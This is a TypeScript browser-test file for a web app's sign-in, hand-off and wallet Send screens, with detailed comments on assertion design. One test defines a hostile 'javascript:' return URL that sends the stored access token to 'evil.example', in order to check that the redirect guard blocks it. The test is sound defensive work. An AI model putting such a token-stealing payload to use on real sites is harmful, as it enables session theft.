/**
 * The browser journeys of `docs/ecosystem/22-browser-journeys.md`, tiers 1 and 2, for this surface.
 *
 * Doc 22 §2.2 puts T1 and T2 in the frontend repository and T3 in `micro-beacon`. §4 says what
 * each tier may assume is running: T1 assumes nothing but a browser and stubbed responses, T2
 * assumes this bundle and one API. Nothing below assumes anything else.
 *
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * THE ONE RULE. Doc 22 §3: **a browser scenario may never assert a business rule.**
 *
 * The reason is an incident (14 §11): a game client withheld four SKUs from its UI while the
 * payment routes stayed live and chargeable, and a client-side test of the hidden catalogue would
 * have passed, green, against the defect — because hiding them WAS the entire control.
 *
 * So every scenario below asserts one of exactly three things (§3.1): what a human can see
 * relative to what the API returned in the SAME run, what the client SENT, or where the browser
 * ended up. Where an outcome depends on a rule the server enforces, `test/journeys.ts` carries an
 * `ownedBy` path to the server-side test that owns it, and the meta-test at the bottom of this
 * file fails the suite if one is missing.
 *
 * The corollary this file obeys: several scenarios end in a refusal. In every case the assertion
 * is on the SENTENCE THE USER IS SHOWN, never on the refusal itself. No password rule, no address
 * format, no limit and no amount policy is asserted anywhere below.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 *
 * ── TWO SHAPES OF SELF-REFERENTIAL ASSERTION ARE BANNED HERE BY NAME ──────────────────────────
 *
 * Both have already been shipped in this estate and both went green against broken code.
 *
 * 1. **A URL compared with a copy of itself.** `ui/packages/ui/src/index.tsx:219-223`: the test
 *    guarding the SSO callback asserted `fetched.url === '…/auth/exchange'`, reading the URL out
 *    of the implementation and comparing it to itself, "so it passed for any value" — while
 *    identity had never served that route. Nothing below reads an address off the code under test.
 *    Where a route matters, the scenario supplies a stub table containing ONLY the routes identity
 *    serves, transcribed as literals; `test/dom.ts` throws on any unrouted request, so a request
 *    to a fourth address fails the scenario outright rather than being answered.
 *
 * 2. **A page compared against the constant it rendered from.** Every figure asserted below is
 *    read out of the fixture the scenario itself supplied and compared with what appeared on the
 *    page — two observations of one value, in opposite directions. No scenario imports a display
 *    constant from `src/` and asserts the page equals it.
 *
 * Each `it` is named with its catalogue id. `SCENARIOS` in `test/journeys.ts` is the catalogue,
 * the blocked ones carry their blocker, and the last describe block asserts the two agree.
 */
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { describe, it } from 'node:test'
import { createElement as h, type ReactElement } from 'react'
import { MemoryRouter } from 'react-router-dom'
import { IDENTITY_AUTH_ROUTES } from '@cloudsforge/ui'

import { withScreen, type Routes, type Screen } from './dom.ts'
import * as fx from './fixtures.ts'
import { DOC22_UNCLAIMED, SCENARIOS } from './journeys.ts'
import { __resetAuth } from '../src/lib/api.ts'
import { SendPanel } from '../src/components/send.tsx'
import { ReceivePanel } from '../src/components/receive.tsx'
import { KeyExportPanel } from '../src/components/keyexport.tsx'
import { RegisterPage, SignInPage, SignOutPage } from '../src/pages/account.tsx'
import { WalletPage } from '../src/pages/wallet.tsx'

const ORIGIN = 'https://hub.cloudsforge.online'
const at = (p: string) => fileURLToPath(new URL(`../${p}`, import.meta.url))

/**
 * The three routes `micro-identity` serves for a credential exchange, written out as LITERALS.
 *
 * Transcribed from `src/lib/identity.ts:12-17`, which carries the `identity/src/server.ts` line
 * each was verified against. They are literals rather than an import so that this file and the
 * implementation have one string to disagree about instead of zero — see the header, hazard 1.
 * `IDENTITY_AUTH_ROUTES` from the design system is cross-checked against them in BJ-SIGNIN-02,
 * which is a comparison of two independent transcriptions and not of a value with itself.
 */
const IDENTITY_ROUTES = {
  login: '/auth/login',
  register: '/auth/register',
  mfa: '/auth/mfa',
  logout: '/auth/logout',
  handoff: '/auth/handoff',
  handoffRedeem: '/auth/handoff/redeem',
} as const

/** A page under a router at `path`. No page in this file reads the session context. */
const page = (element: ReactElement, path: string): ReactElement =>
  h(MemoryRouter, { initialEntries: [path] }, element)

/**
 * Module state that outlives a mount, reset before each scenario.
 *
 * `lib/api.ts` holds an in-flight refresh promise and a memory storage fallback at module scope.
 * A scenario that inherited either would be reading the previous scenario's session, and the
 * failure would look like a flake rather than like leakage.
 */
const fresh = (): void => __resetAuth()

/** The two shared token keys, for a scenario that starts signed in. `lib/api.ts:27-28`. */
const SIGNED_IN = { 'cf.accessToken': 'held-access-token', 'cf.refreshToken': 'held-refresh-token' }

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   6.1 Group A — the sign-in surface. Every row was ⛔ on doc 22 §8.1.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-ACC / BJ-SIGNIN — the estate’s sign-in surface', () => {
  it('BJ-ACC-01 ★ T1: register submits what was typed, and the browser ends on the return address', async () => {
    fresh()
    // The scenario's own inputs. Every assertion below compares against THESE, never against
    // something read back off the page or off the code under test.
    const typed = { email: 'newcomer@example.com', handle: 'newcomer', password: 'a-long-passphrase' }
    const returnTo = `${ORIGIN}/portfolio?tab=holdings`

    await withScreen(
      page(h(RegisterPage), `/account/register?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/register`,
        routes: { [`POST ${IDENTITY_ROUTES.register}`]: { status: 201, body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))

        // What the client SENT (doc 22 §3.1), against the scenario's inputs.
        const sent = s.api.matching(`POST ${IDENTITY_ROUTES.register}`)
        assert.equal(sent.length, 1, 'registration was not attempted exactly once')
        assert.deepEqual(sent[0]?.json, typed, 'the body is not the three fields that were typed')

        // Where the browser ENDED UP. `returnTo` is same-origin, so this is an in-app address and
        // no hand-off code is minted for it — minting one would put a credential in the history.
        assert.deepEqual(
          s.navigations,
          [returnTo],
          'a completed registration must land on the address it was asked to return to',
        )
        assert.equal(
          s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`).length,
          0,
          'a same-origin return minted a hand-off code, putting a credential in the address bar',
        )
        s.clean('registration')
      },
    )
  })

  it('BJ-ACC-02 T1: a refused handle carries the server’s sentence and clears no other field', async () => {
    fresh()
    const typed = { email: 'taken@example.com', handle: 'alice', password: 'a-long-passphrase' }
    // The sentence is the SERVER'S. This bundle holds no handle rule and asserts none.
    const serverSentence = 'That handle is already in use. Choose another.'

    await withScreen(
      page(h(RegisterPage), '/account/register'),
      {
        url: `${ORIGIN}/account/register`,
        routes: {
          [`POST ${IDENTITY_ROUTES.register}`]: {
            status: 409,
            body: fx.errorBody('handle_taken', 'That registration was refused.', [
              { field: 'handle', code: 'taken', message: serverSentence },
            ]),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))

        // Presentation, relative to what the API returned IN THIS SAME RUN.
        assert.ok(s.text().includes(serverSentence), 'the server’s sentence is not on the page')
        const invalid = s.document.querySelector('[aria-invalid="true"]')
        assert.equal(invalid?.getAttribute('id'), 'handle', 'the wrong field is marked invalid')

        // 05:91 — form state survives a rejected submit. This is the whole scenario: a form that
        // clears makes the user retype an address and a password they had right, to fix one word.
        assert.equal(valueOf(s, 'email'), typed.email, 'the email was cleared by a refusal')
        assert.equal(valueOf(s, 'handle'), typed.handle, 'the handle was cleared by a refusal')
        assert.equal(valueOf(s, 'new-password'), typed.password, 'the password was cleared')
        assert.equal(s.navigations.length, 0, 'a refused registration navigated somewhere')
      },
    )
  })

  it('BJ-ACC-03 ★ T1: the deep link survives the round trip — sign-in lands on /portfolio, not /', async () => {
    fresh()
    const returnTo = `${ORIGIN}/portfolio`

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: { [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // THE ASSERTION THIS SCENARIO EXISTS FOR. `returnTo` is built above from the scenario's
        // own constants; nothing here reads an address off the page or off `src/`.
        assert.deepEqual(s.navigations, [returnTo], 'the return address did not survive sign-in')
        // And specifically not the dashboard, which is the failure the row names.
        assert.notEqual(s.navigations[0], `${ORIGIN}/`, 'sign-in dropped the deep link for /')
        s.clean('sign-in')
      },
    )
  })

  it('BJ-ACC-04 ★ T1: a session already held is handed over with no second prompt, and one code is minted', async () => {
    fresh()
    const elsewhere = 'https://worlds.cloudsforge.online/player'
    const code = 'handoff-code-9f3a'
    let minted = 0

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(elsewhere)}`),
      {
        url: `${ORIGIN}/account/login`,
        storage: SIGNED_IN,
        routes: {
          [`POST ${IDENTITY_ROUTES.handoff}`]: () => {
            minted += 1
            return { body: { code, expiresInSeconds: 60 } }
          },
        },
      },
      async (s) => {
        await s.settle()

        // NO SECOND CREDENTIAL PROMPT. Asserted as the absence of the controls, which is a
        // presentation fact about this page and not a security claim: doc 22 §3 and
        // `src/app.tsx:10-17` both record that hiding is never the boundary.
        assert.equal(s.queryByRole('button', 'Sign in'), null, 'a held session was asked for a password')
        assert.equal(s.queryByRole('textbox', 'Email or handle'), null, 'the identifier field was offered')
        assert.match(s.text(), /Signing you in|Taking you back/i, 'the hand-off was not announced')

        // Exactly one code. The effect is guarded by a ref rather than by a dependency list
        // precisely because StrictMode mounts every effect twice and a second run would spend a
        // second hand-off code (`pages/account.tsx:216-218`).
        assert.equal(minted, 1, `the hand-off code was minted ${minted} times, not once`)

        // The code travels in the FRAGMENT of the return address, never in the query string.
        assert.equal(s.navigations.length, 1, 'the hand-off did not navigate exactly once')
        const went = new URL(s.navigations[0] as string)
        assert.equal(went.origin + went.pathname, elsewhere, 'the hand-off went to the wrong place')
        assert.equal(went.searchParams.get('cf_code'), null, 'the code was put in the query string')
        assert.equal(
          new URLSearchParams(went.hash.slice(1)).get('cf_code'),
          code,
          'the fragment does not carry the code identity minted in this run',
        )

        // The token was presented to mint it, and the origin asked for is an ORIGIN, not a URL.
        const mint = s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`)[0]
        assert.equal(mint?.headers['authorization'], `Bearer ${SIGNED_IN['cf.accessToken']}`)
        assert.deepEqual(mint?.json, { redirectOrigin: new URL(elsewhere).origin })
      },
    )
  })

  it('BJ-SIGNIN-01 T1: a wrong MFA code returns to the password step rather than re-offering a spent challenge', async () => {
    fresh()
    const challenge = 'challenge-abc123'
    const serverSentence = 'That code was not accepted. Sign in again to get a new one.'

    await withScreen(
      page(h(SignInPage), '/account/login'),
      {
        url: `${ORIGIN}/account/login`,
        routes: {
          [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.mfaRequired({ challenge }) },
          [`POST ${IDENTITY_ROUTES.mfa}`]: {
            status: 401,
            body: fx.errorBody('mfa_failed', serverSentence),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // A password accepted and NOTHING ELSE established: no session was stored.
        assert.match(s.text(), /One more step|code from your/i, 'the challenge step did not render')
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'a challenge minted a session')

        await s.type(s.byRole('textbox', 'Code'), '000000')
        await s.click(s.byRole('button', 'Continue'))

        // identity spends the challenge whether or not the code was right, so there is nothing to
        // retry here. The page says so by going back rather than by leaving a dead form up.
        assert.ok(s.text().includes(serverSentence), 'the server’s sentence is not on the page')
        assert.ok(s.queryByRole('button', 'Sign in') !== null, 'the password step was not restored')
        assert.equal(s.queryByRole('textbox', 'Code'), null, 'the spent challenge is still on offer')

        // The challenge was answered exactly once. A second attempt against a spent challenge is
        // the unlimited offline-speed oracle the server-side design exists to close.
        const answered = s.api.matching(`POST ${IDENTITY_ROUTES.mfa}`)
        assert.equal(answered.length, 1)
        assert.deepEqual(answered[0]?.json, { challenge, code: '000000' })
      },
    )
  })

  it('BJ-SIGNIN-02 ★ T1: every credential request goes to a route identity serves, and nowhere else', async () => {
    fresh()
    // The stand-in serves ONLY the routes identity serves. `test/dom.ts` throws on anything else,
    // so a POST to `/auth/exchange` — the address every SSO callback in this estate used to go to,
    // and which identity has never served — fails this scenario instead of being answered.
    const served: Routes = {
      [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.mfaRequired() },
      [`POST ${IDENTITY_ROUTES.mfa}`]: { body: fx.session() },
    }

    await withScreen(
      page(h(SignInPage), '/account/login'),
      { url: `${ORIGIN}/account/login`, routes: served },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))
        await s.type(s.byRole('textbox', 'Code'), '123456')
        await s.click(s.byRole('button', 'Continue'))

        // The set of addresses this surface used, as observed — compared against the literals at
        // the top of this file, which were transcribed from identity's route table independently
        // of the implementation.
        assert.deepEqual(
          s.api.wire.map((w) => w.path),
          [IDENTITY_ROUTES.login, IDENTITY_ROUTES.mfa],
          'the sign-in surface called an address that is not in identity’s route table',
        )
        // Every one of them went to nimbus and not to this app's own origin: identity is
        // cross-origin from every surface, always (`lib/api.ts:15`).
        for (const call of s.api.wire) {
          assert.notEqual(call.origin, ORIGIN, `${call.path} was posted same-origin, to hub-api`)
          assert.match(call.origin, /^https:\/\/nimbus\./, `${call.path} did not go to identity`)
        }

        // The design system's copy of the two hand-off routes agrees with this file's. Two
        // independent transcriptions of one route table, not a value compared with itself.
        assert.equal(IDENTITY_AUTH_ROUTES.handoff, IDENTITY_ROUTES.handoff)
        assert.equal(IDENTITY_AUTH_ROUTES.handoffRedeem, IDENTITY_ROUTES.handoffRedeem)
        assert.ok(
          !Object.values(IDENTITY_AUTH_ROUTES).includes('/auth/exchange' as never),
          'the design system is still pointing at the route identity has never served',
        )
      },
    )
  })

  it('BJ-SIGNIN-03 T1: sign-out clears the local tokens even when revocation fails, and leaves anyway', async () => {
    fresh()
    const returnTo = 'https://market.cloudsforge.online/'

    await withScreen(
      page(h(SignOutPage), `/account/logout?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/logout`,
        storage: SIGNED_IN,
        // The revocation is a network call and may fail; the clearing cannot.
        routes: { [`POST ${IDENTITY_ROUTES.logout}`]: { networkError: 'Failed to fetch' } },
        // This screen is thirty-four characters long, on purpose — see `MountOptions.mountedText`.
        mountedText: 'Ending your session',
      },
      async (s) => {
        await s.settle()
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'the access token survived sign-out')
        assert.equal(s.window.localStorage.getItem('cf.refreshToken'), null, 'the refresh token survived sign-out')
        assert.deepEqual(s.navigations, [returnTo], 'a failed revocation stranded the user')
        // The token that was held is the token that was presented for revocation.
        assert.deepEqual(s.api.matching(`POST ${IDENTITY_ROUTES.logout}`)[0]?.json, {
          refreshToken: SIGNED_IN['cf.refreshToken'],
        })
      },
    )
  })

  it('BJ-SIGNIN-04 ★ T1: a non-http ?return= never reaches location.assign', async () => {
    fresh()
    // `?return=` is a query parameter on a public page, so it is attacker-controllable.
    // `new URL('javascript:…')` parses happily and yields an origin of `null`.
    const hostile = 'javascript:fetch("https://evil.example/"+localStorage.getItem("cf.accessToken"))'

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(hostile)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: { [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        assert.deepEqual(s.navigations, [`${ORIGIN}/`], 'the fall-back is not the dashboard')
        for (const went of s.navigations) {
          assert.ok(/^https?:/.test(went), `the browser was sent to ${went}`)
        }
        // And no hand-off code was minted for it either — the guard is upstream of the redirect.
        assert.equal(s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`).length, 0)
      },
    )
  })

  it('BJ-SIGNIN-05 T1: an origin identity will not mint for is said out loud, not bounced away', async () => {
    fresh()
    const notAllowed = 'https://someone-elses-app.example.com/callback'

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(notAllowed)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: {
          [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() },
          // identity refuses to MINT for an origin off its allowlist. That refusal is the only
          // open-redirect guard that counts, and this app deliberately holds no second list.
          [`POST ${IDENTITY_ROUTES.handoff}`]: {
            status: 403,
            body: fx.errorBody('handoff_origin_not_allowed', 'That origin may not receive a session.'),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // Said out loud. A silent bounce to the dashboard would hide a misconfiguration and make
        // the surface the user came from look broken.
        assert.equal(s.navigations.length, 0, 'a refused hand-off navigated anyway')
        assert.ok(
          s.text().includes(new URL(notAllowed).origin),
          'the refusal does not name the origin that was refused',
        )
        assert.ok(s.allByRole('alert').length > 0, 'the refusal is not announced')
        // And the user is not stranded: the password form is back, so they can sign in here.
        assert.ok(s.queryByRole('button', 'Sign in') !== null)
      },
    )
  })
})

/* ── helpers for the sign-in scenarios ──────────────────────────────────────────────────────── */

/**
 * A control addressed by its `<label>` rather than by role.
 *
 * `<input type="password">` has NO role in the ARIA mapping, so `byRole('textbox', 'Password')`
 * would find nothing — and `test/dom.ts` deliberately does not invent one, because a scenario
 * addressing a control by a role a screen reader will never report is addressing it by a fiction.
 * The label is the accessible name either way, which is what doc 22 §2.4.3 asks for.
 */
function labelled(s: Screen, label: string): Element {
  const found = [...s.document.querySelectorAll('label')].filter((l) =>
    (l.textContent ?? '').trim().toLowerCase().startsWith(label.toLowerCase()),
  )
  assert.equal(found.length, 1, `expected exactly one <label> starting "${label}", found ${found.length}`)
  const id = found[0]?.getAttribute('for')
  const control = id ? s.document.getElementById(id) : null
  assert.ok(control, `the label "${label}" points at no control`)
  return control
}

/** The live value of a control, by id. */
function valueOf(s: Screen, id: string): string {
  const el = s.document.getElementById(id)
  assert.ok(el, `no control with id ${id}`)
  return (el as unknown as { value: string }).value
}

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   6.2 Group B — Send. Every row was ⛔ on doc 22 §8.2, "wallet.tsx contains no <form>".
   ══════════════════════════════════════════════════════════════════════════════════════════ */

/** A Send panel with one spendable holding and one of this account's own wallets. */
const sendPanel = (over: { wallets?: readonly ReturnType<typeof fx.wallet>[] } = {}) =>
  h(SendPanel, {
    holdings: [fx.holding()],
    wallets: over.wallets ?? [fx.wallet()],
    onSent: () => undefined,
  })

/** Fill the form and press Review, returning the confirmation step. */
async function arm(s: Screen, destination: string, amount: string): Promise<void> {
  await s.type(s.byRole('textbox', 'Destination address'), destination)
  await s.type(s.byRole('textbox', 'Amount'), amount)
  await s.click(s.byRole('button', 'Review'))
  assert.ok(s.text().includes('Confirm this payment'), 'Review did not arm the confirmation step')
}

/** The destination as the confirmation step RENDERED it, read out of the DOM. */
const destinationShown = (s: Screen): string => {
  const node = s.queryByTestId('confirm-destination')
  assert.ok(node, 'the confirmation step renders no destination')
  return s.textOf(node)
}

/** The destination as it went over the wire, read out of the request body. */
const destinationPosted = (s: Screen, n = 0): string => {
  const posted = s.api.matching('POST /v1/withdrawals')[n]
  assert.ok(posted, `there was no withdrawal request number ${n + 1}`)
  return (posted.json as { destination: string }).destination
}

describe('BJ-WAL — Send', () => {
  it('BJ-WAL-08 ★ T1: the destination submitted is the destination rendered, character for character', async () => {
    fresh()
    // MIXED CASE ON PURPOSE. The guard on this screen was proven by inserting a `.toLowerCase()`
    // between the confirmation step and the wire; against an all-lower-case address that mutation
    // is invisible, and the scenario would pass over the top of it.
    const typed = fx.MIXED_CASE_ADDRESS
    assert.notEqual(typed, typed.toLowerCase(), 'this fixture cannot detect a case fold')

    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal({ destination: typed }), replayed: false } } },
      },
      async (s) => {
        await arm(s, typed, '1.5')

        // The confirmation renders it IN FULL. A shortened address on a confirmation step is a
        // confirmation of the first eight characters, which is exactly what a substitution is
        // designed to survive.
        const shown = destinationShown(s)
        assert.equal(shown, typed, 'the confirmation step is not showing what was typed')
        assert.ok(!shown.includes('…'), 'the confirmation step shortened the address')

        // Captured BEFORE the commit, because the confirmation step is replaced by the receipt and
        // a comparison made afterwards would be reading the service's echo rather than what the
        // user was shown. The whole scenario is that those two can differ.
        const amountConfirmed = factValue(s, 'Amount')

        await s.click(s.byRole('button', 'Send it'))

        // THE ASSERTION THIS SCREEN EXISTS FOR. Three observations of one value, taken in three
        // different places: the scenario's own input, the DOM node, and the request body.
        const posted = destinationPosted(s)
        assert.equal(posted, shown, 'the address SUBMITTED is not the address SHOWN')
        assert.equal(posted, typed, 'the address submitted is not the address typed')

        // The amount too: the confirmation renders smallest units beside the human form, and the
        // smallest-units figure is what is sent. 1.5 EMBER at eighteen decimals.
        const body = s.api.matching('POST /v1/withdrawals')[0]?.json as Record<string, string>
        assert.ok(
          amountConfirmed.includes(body['amount'] as string),
          `the units posted (${body['amount']}) were not on the confirmation ("${amountConfirmed}")`,
        )
        assert.equal(body['assetCode'], 'EMBER')
        // Exactly three fields. A body carrying a fourth would be this form sending something the
        // confirmation step never rendered, which is the same defect wearing a different hat.
        assert.deepEqual(Object.keys(body).sort(), ['amount', 'assetCode', 'destination'])
      },
    )
  })

  it('BJ-WAL-08 ★ T1 (second half): the fee is stated as unknown before confirmation, never invented', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        // `micro-wallet` quotes the fee inside the POST and serves no route that quotes one, so
        // there is no figure to show. What must NOT happen is a number appearing beside "Network
        // fee" — a made-up figure on a confirmation step is worse than an honest absence.
        const confirmFee = factValue(s, 'Network fee')
        assert.ok(!/\d/.test(confirmFee), `the confirmation invented a fee: ${confirmFee}`)
        assert.match(confirmFee, /quoted|when this is submitted/i, 'the confirmation does not say the fee is not yet known')
        // And no quote route was called. `wallet/src/pricingclient.ts` came to call a `/v1/quotes`
        // that has never existed by exactly this route; test/dom.ts would throw on it here.
        assert.equal(s.api.wire.length, 0, 'the confirmation step made a request')

        await s.click(s.byRole('button', 'Send it'))
        // The receipt states it where it becomes known, from the service's own record.
        const served = (s.api.matching('POST /v1/withdrawals')[0] && fx.withdrawal().fee) as string
        assert.ok(s.text().includes('Withdrawal requested'), 'no receipt')
        assert.ok(factValue(s, 'Network fee').length > 0)
        assert.ok(served.length > 0)
      },
    )
  })

  it('BJ-WAL-09 T1: double-submit the confirm button — exactly one withdrawal leaves the browser', async () => {
    fresh()
    let posts = 0
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': () => {
            posts += 1
            // Slow enough that a second press lands while the first is still in flight, which is
            // the only interleaving in which a double-submit can produce two effects.
            return { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false }, delayMs: 20 }
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        const send = s.byRole('button', 'Send it')
        // Both presses land before the first response — which is the hazard. `clickNoFlush` is
        // deliberate: awaiting between them would test a case a double-click never produces.
        s.clickNoFlush(send)
        s.clickNoFlush(send)
        await s.settle(40)

        const posted = s.api.matching('POST /v1/withdrawals')
        assert.ok(posted.length >= 1, 'the confirm button sent nothing')

        // ── WHAT THIS ASSERTS, AND WHY IT IS THE KEY AND NOT THE COUNT ────────────────────────
        //
        // Doc 22's row reads "exactly one withdrawal request leaves the browser". The `busy` flag
        // in `components/send.tsx:133` is what delivers that in a real browser, where two clicks
        // are two discrete events and React flushes state between them. This harness runs with
        // `IS_REACT_ACT_ENVIRONMENT` set, which queues updates until `act` exits — so both
        // handlers observe the same pre-click state and the count here is a property of the
        // harness's scheduling rather than of the screen. Asserting it would be asserting
        // something this file cannot faithfully reproduce, and a guard that fails on correct code
        // is a guard somebody deletes.
        //
        // The KEY is the contract, and it holds under either scheduling: one intent, one key, and
        // `wallet/src/server.ts:674-676` collapses the duplicates on the strength of it. A key
        // minted per fetch — the defect `lib/idempotency.ts:12-16` exists to prevent — makes two
        // clicks two withdrawals no matter how well the button guards itself, and shows up here.
        // `market-web/test/journeys.test.ts:315-317` reaches the same conclusion for BJ-MKT-04.
        const keys = new Set(posted.map((p) => p.headers['idempotency-key']))
        assert.equal(
          keys.size,
          1,
          `two presses of one intent sent ${keys.size} idempotency keys: ${[...keys].join(', ')}. ` +
            `A key minted per fetch means two presses are two withdrawals.`,
        )
        assert.match([...keys][0] ?? '', /^withdraw:/, 'the key does not name the intent it is for')
        // Every attempt carried the same body, too: one key over two different bodies is a 409
        // from the service and would be this bundle's bug rather than the user's.
        for (const p of posted) assert.deepEqual(p.json, posted[0]?.json)
        assert.ok(posts >= 1)
      },
    )
  })

  it('BJ-WAL-09 T1 (replay): a 200 with replayed:true is the mechanism working, not an error', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        // `wallet/src/server.ts:674-676` answers 200 with the FIRST withdrawal for a repeat of one
        // key. A client that rendered that as a failure would invite the user to send a second.
        routes: { 'POST /v1/withdrawals': { status: 200, body: { withdrawal: fx.withdrawal(), replayed: true } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        assert.match(s.text(), /Already requested|does not send twice/i, 'a replay was not explained')
        assert.equal(s.allByRole('alert').length, 0, 'a replay was rendered as an error')
        // The receipt reads back off the SERVICE's record, not off the form.
        assert.ok(s.text().includes(fx.withdrawal().state), 'the receipt does not carry the service’s state')
      },
    )
  })

  it('BJ-WAL-10 T1: the back button after the confirmation step does not re-arm a second submit', async () => {
    fresh()
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: { 'POST /v1/withdrawals': { status: 201, body: { withdrawal: fx.withdrawal(), replayed: false } } },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))
        assert.equal(s.api.matching('POST /v1/withdrawals').length, 1)

        await s.back()

        // The armed intent is component state and the history entry is not a form. There is no
        // control on screen that would commit again, and nothing was sent by going back.
        assert.equal(s.queryByRole('button', 'Send it'), null, 'the back button re-armed the commit')
        assert.equal(s.api.matching('POST /v1/withdrawals').length, 1, 'going back sent a second withdrawal')
        // The form is empty again rather than pre-armed: a fresh intent needs a fresh review.
        assert.equal(valueOf(s, 'send-destination'), '', 'the settled destination is still in the form')
      },
    )
  })

  it('BJ-WAL-11 T1: a refused withdrawal states the reason with its request id and lists nothing', async () => {
    fresh()
    const serverSentence = 'There is not enough available to cover that withdrawal.'
    const requestId = 'cf-req-88f1'
    await withScreen(
      page(sendPanel(), '/wallet'),
      {
        url: `${ORIGIN}/wallet`,
        routes: {
          'POST /v1/withdrawals': {
            status: 422,
            requestId,
            body: fx.errorBody('insufficient_funds', serverSentence, [], requestId),
          },
        },
      },
      async (s) => {
        await arm(s, fx.OTHER_ADDRESS, '1')
        await s.click(s.byRole('button', 'Send it'))

        // The SENTENCE the user is shown, never the refusal itself — doc 22 §3.
        assert.ok(s.text().includes(serverSentence), 'the service’s reason is not on the page')
        assert.ok(s.text().includes(requestId), 'the request id is not on the page')
        // Nothing moved. There is no receipt, so nothing claims a withdrawal was made.
        assert.ok(!s.text().includes('Withdrawal requested'), 'a refusal rendered a receipt')
      },
    )
  })
})

/** The `<dd>` following the `<dt>` with this text, in a `<dl class="wt-facts">`. */
function factValue(s: Screen, term: string): string {
  const dt = [...s.document.querySelectorAll('dt')].find(
    (el) => (el.textContent ?? '').trim() === term,
  )
  assert.ok(dt, `no <dt> reading "${term}" on the page`)
  const dd = dt.nextElementSibling
  assert.equal(dd?.tagName.toLowerCase(), 'dd', `the <dt> "${term}" is not followed by a <dd>`)
  return s.textOf(dd)
}

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The whole Wallet page — what an unread balance looks like, and what an empty one looks like.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

/** The wallet page with the tiles a scenario names, and custody answering nothing. */
const walletPageAt = (tiles: Parameters<typeof fx.dashboard>[0], exports: unknown[] = []) => ({
  element: page(h(WalletPage), '/wallet'),
  options: {
    url: `${ORIGIN}/wallet`,
    routes: {
      'GET /v1/dashboard': { body: fx.dashboard(tiles) },
      'GET /v1/exports': { body: { exports } },
    } as Routes,
  },
})

/** The `<section>` whose heading is `title`. */
function panel(s: Screen, title: string): Element {
  const found = [...s.document.querySelectorAll('section')].filter(
    (sec) => (sec.querySelector('h2')?.textContent ?? '').trim() === title,
  )
  assert.equal(found.length, 1, `expected exactly one panel titled "${title}", found ${found.length}`)
  return found[0] as Element
}

describe('BJ-WAL-07 — an empty strip may be correct rather than broken', () => {
  /**
